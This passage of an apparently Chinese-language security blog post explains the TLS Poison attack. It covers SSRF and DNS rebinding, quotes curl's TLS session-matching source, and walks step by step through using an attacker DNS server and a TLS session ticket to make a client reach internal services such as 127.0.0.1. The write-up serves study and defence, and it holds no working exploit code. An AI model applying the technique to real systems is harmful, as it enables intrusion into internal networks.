pre_shared_key</span><br><span class="line">                                               + key_share*</span><br><span class="line">                                      {EncryptedExtensions}</span><br><span class="line">                                              + early_data*</span><br><span class="line">                                                 {Finished}</span><br><span class="line">                        &lt;--------       [Application Data*]</span><br><span class="line">(EndOfEarlyData)</span><br><span class="line">{Finished}              --------&gt;</span><br><span class="line">[Application Data]      &lt;-------&gt;        [Application Data]</span><br><span class="line"></span><br><span class="line">      +  Indicates noteworthy extensions sent <span class="hljs-keyword">in</span> the</span><br><span class="line">         previously noted message.</span><br><span class="line"></span><br><span class="line">      *  Indicates optional <span class="hljs-keyword">or</span> situation-dependent</span><br><span class="line">         messages/extensions that are <span class="hljs-keyword">not</span> always sent.</span><br><span class="line"></span><br><span class="line">      () Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a client_early_traffic_secret.</span><br><span class="line"></span><br><span class="line">      {} Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> a [sender]_handshake_traffic_secret.</span><br><span class="line"></span><br><span class="line">      [] Indicates messages protected using keys</span><br><span class="line">         derived <span class="hljs-keyword">from</span> [sender]_application_traffic_secret_N.</span><br><span class="line"></span><br><span class="line">      Figure 4: Message Flow <span class="hljs-keyword">for</span> a 0-RTT Handshake</span><br></pre></td></tr></tbody></table></figure><p></p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>服务器端请求伪造 (Server-Side Request Forgery, SSRF) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://dpsvdv74uwwos.cloudfront.net/statics/img/blogposts/exploiting_ssrf_vulnerability.png" alt=""></p><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS重新绑定是计算机攻击的一种形式。 在这种攻击中，恶意网页会导致访问者运行客户端脚本，攻击网络上其他地方的计算机。攻击者注册一个域名（如attacker.com），并在攻击者控制下将其代理给DNS服务器。 服务器配置为很短响应时间的TTL记录，防止响应被缓存。 当受害者浏览到恶意域时，攻击者的DNS 服务器首先用托管恶意客户端代码的服务器的 IP 地址作出响应。 例如，他们可以将受害者的浏览器指向包含旨在在受害者计算机上执行的恶意 JavaScript 或 Flash 脚本的网站。</p><p>恶意客户端代码会对原始域名（例如attacker.com）进行额外访问，这些都是由同源政策所允许的。 但是，当受害者的浏览器运行该脚本时，它会为该域创建一个新的 DNS 请求，并且攻击者会使用新的 IP 地址进行回复。 例如，他们可以使用内部 IP 地址或互联网上某个目标的IP地址进行回复。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://torbencapiau.be/wp-content/uploads/2019/12/chrome_O70990jBNt-1024x574.png" alt=""></p><h2 id="TLS-Poison"><a href="#TLS-Poison" class="headerlink" title="TLS Poison"></a>TLS Poison</h2><p>好了，终于介绍完背景知识了，现在让我们来看看本次要介绍的 TLS Poison 攻击。</p><p>这里一句话帮大家总结概括一下：我们可以利用 TLS Session Resumption 的特性结合 DNS Rebinding 技巧操作一些客户端帮助我们进行 SSRF 攻击。</p><p>其实整个攻击就像上述说的一样，非常通俗易懂，无非就是 TLS Session Resumption 、 DNS Rebinding 、一个傻白甜受害者，结合在一起就便有了我们的 TLS Poison 。</p><p><strong>PS: 如无特殊说明，整个实验背景均基于 Ubuntu 20.04 LTS ，curl 7.68.0 build with OpenSSL/1.1.1f  ，后文提到的 IPv6 均指的是  IPv4-mapped IPv6 addresses 这类地址</strong></p><h3 id="Attack-Steps"><a href="#Attack-Steps" class="headerlink" title="Attack Steps"></a>Attack Steps</h3><p>让我们进一步来看看这个攻击思路：</p><ol><li>首先我们可以从背景知识当中知道 TLS Session Resumption 特性，无论是 TLS 1.2 或者 1.3 ，它们都会使用了一个凭据一样的东西来表明客户端的身份，就像在 Web 浏览中的 Cookie 一样，这个凭据又是由服务端下发给客户端的，所以如果我们有一个恶意的 Server ，让一个客户端使用 HTTPS 访问我们的服务器时，在 TLS 握手时这个凭据就是我们恶意服务器分配给客户端的，而客户端会把这个凭据按照<strong>一定规则</strong>存储起来，以便以后需要跟我们恶意服务器恢复上一次会话时使用。所以，从这里我们可以知道，如果可以让客户端以 HTTPS 形式访问任意服务器，在进行 TLS 握手时我们可以让客户端存储我们指定的会话凭据。</li><li>接着，在进行 HTTPS 请求前，客户端必定需要对我们给的域名进行一次 DNS 查询，而在客户端想要恢复会话的时候，<strong>如果客户端的 DNS 缓存过期</strong>，则又会进行一次 DNS 查询；如果没有过期，则利用之前的 DNS 查询结果得到的 IP 进行恢复会话。所以当条件满足，也就是正好在客户端想要恢复 TLS 会话，而 DNS 缓存又过期了的时候，就会发起一次 DNS 查询，这里正好就满足了 DNS Rebinding 的条件。</li><li>这样我们就可以为自己的域名搭建一个 DNS 服务器，在客户端第一次发起 DNS 请求时，我们让 DNS 服务器返回正确的、指向我们恶意服务器的 IP ，让第一次 TLS 握手成功，也让客户端缓存我们制定的会话凭据；在客户端恢复会话时，也就是客户端发起第二次 DNS 请求时，我们让 DNS 服务器返回我们想要攻击的内网地址，例如 127.0.0.1 ，这样在客户端尝试恢复会话的时候，客户端会拿着我们给它的特制票据去与这个地址尝试进行 TLS 握手。</li><li>这意味着什么呢？特制的票据、指定的内网地址，就构成了一次对内网服务的请求！</li></ol><p>但是似乎我们又忽略了什么？如果我想攻击内网的 Memcached ，端口在 11211 不在 443 怎么办？正如我们上面所强调的“客户端会把这个凭据按照<strong>一定规则</strong>存储起来”，那么这个<strong>一定规则</strong>又是什么呢？</p><p>我们可以随便找个例子来看，比如 curl 7.75.0 ，在 curl 源码的 lib/vtls/vtls.c#408 文件当中，我们可以找到这样的代码：</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; data-&gt;<span class="hljs-built_in">set</span>.general_ssl.max_ssl_sessions; i++) {</span><br><span class="line">  check = &amp;data-&gt;state.session[i];</span><br><span class="line">  <span class="hljs-keyword">if</span>(!check-&gt;sessionid)</span><br><span class="line">    <span class="hljs-comment">/* not session ID means blank entry */</span></span><br><span class="line">    <span class="hljs-keyword">continue</span>;</span><br><span class="line">  <span class="hljs-keyword">if</span>(strcasecompare(name, check-&gt;name) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_host &amp;&amp; !check-&gt;conn_to_host) ||</span><br><span class="line">      (conn-&gt;bits.conn_to_host &amp;&amp; check-&gt;conn_to_host &amp;&amp;</span><br><span class="line">       strcasecompare(conn-&gt;conn_to_host.name, check-&gt;conn_to_host))) &amp;&amp;</span><br><span class="line">     ((!conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port == <span class="hljs-number">-1</span>) ||</span><br><span class="line">      (conn-&gt;bits.conn_to_port &amp;&amp; check-&gt;conn_to_port != <span class="hljs-number">-1</span> &amp;&amp;</span><br><span class="line">       conn-&gt;conn_to_port == check-&gt;conn_to_port)) &amp;&amp;</span><br><span class="line">     (port == check-&gt;remote_port) &amp;&amp;</span><br><span class="line">     strcasecompare(conn-&gt;handler-&gt;scheme, check-&gt;scheme) &amp;&amp;</span><br><span class="line">     Curl_ssl_config_matches(ssl_config, &amp;check-&gt;ssl_config)) {</span><br><span class="line">    <span class="hljs-comment">/* yes, we have a session ID! */</span></span><br><span class="line">    (*general_age)++;          <span class="hljs-comment">/* increase general age */</span></span><br><span class="line">    check-&gt;age = *general_age; <span class="hljs-comment">/* set this as used in this age */</span></span><br><span class="line">    *ssl_sessionid = check-&gt;sessionid;</span><br><span class="line">    <span class="hljs-keyword">if</span>(idsize)</span><br><span class="line">      *idsize = check-&gt;idsize;</span><br><span class="line">    no_match = FALSE;</span><br><span class="line">    <span class="hljs-keyword">break</span>;</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>上述代码就是通过对于端口、协议、域名的比较来决定是否使用 sessionid ，而<code>check</code>变量的结构体就是<code>Curl_ssl_session</code>，在 lib/urldata.h#295 当中，我们还可以看到对于<code>Curl_ssl_session</code>结构体的定义</p><p></p><figure class="highlight c hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment">/* information stored about one single SSL session */</span></span><br><span class="line"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Curl_ssl_session</span> {</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *name;       <span class="hljs-comment">/* host name for which this ID was used */</span></span><br><span class="line">  <span class="hljs-keyword">char</span> *conn_to_host; <span class="hljs-comment">/* host name for the connection (may be NULL) */</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *scheme; <span class="hljs-comment">/* protocol scheme used */</span></span><br><span class="line">  <span class="hljs-keyword">void</span> *sessionid;  <span class="hljs-comment">/* as returned from the SSL layer */</span></span><br><span class="line">  <span class="hljs-keyword">size_t</span> idsize;    <span class="hljs-comment">/* if known, otherwise 0 */</span></span><br><span class="line">  <span class="hljs-keyword">long</span> age;         <span class="hljs-comment">/* just a number, the higher the more recent */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> remote_port;  <span class="hljs-comment">/* remote port */</span></span><br><span class="line">  <span class="hljs-keyword">int</span> conn_to_port; <span class="hljs-comment">/* remote port for the connection (may be -1) */</span></span><br><span class="line">  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ssl_primary_config</span> <span class="hljs-title">ssl_config</span>;</span> <span class="hljs-comment">/* setup for this session */</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>所以对于 curl 7.75.0 来说，这个规则就是端口相同、域名相同、协议相同， curl 就会尝试去使用 sessionid 进行访问。</p><p>所以整个攻击思路我们大体上就明白了，让我们再来看看作者当初提出的攻击流程，直观感受一下这个攻击（这里我们用 HTTPS 举例）：</p><ol><li>首先第一步攻击者发送一个 <a href="https://jmaddux.com:25" target="_blank" rel="noopener">https://jmaddux.com:25</a> 的地址给一个 Client ，Client 会首先进行 DNS 查询询问 jmaddux.com 的 IP 地址，此时攻击者自己控制的 DNS Server 可以自定义响应为一个正常的 IP ，比如 35.x.x.x ，此时我们可以给这个响应记录非常短非常短的 TTL ，以便让 Client 不要缓存我们的 DNS 记录。</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/4.jpg" alt=""></p><ol start="2"><li>第二步， Client 会与攻击者指定的 35.x.x.x 这个攻击者的服务器进行 TLS 握手，并获得攻击者服务器返回给 Client 的特制的票据，在图中表示为 Payload ，然后完成 TLS 握手。</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/5.jpg" alt=""></p><ol start="3"><li>第三部，当 Client 想与 Server 恢复会话时，需要再次查找 jmaddux.com 的 DNS 记录，由于攻击者之前给的 DNS 记录 TTL 时间非常非常短，让其在此时在自己的缓存中查不到原来的记录，这样会使得 Client 又去询问 jmaddux.com 的 DNS 记录，此时攻击者让其 DNS Server 返回 127.0.0.1 这个地址。</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZ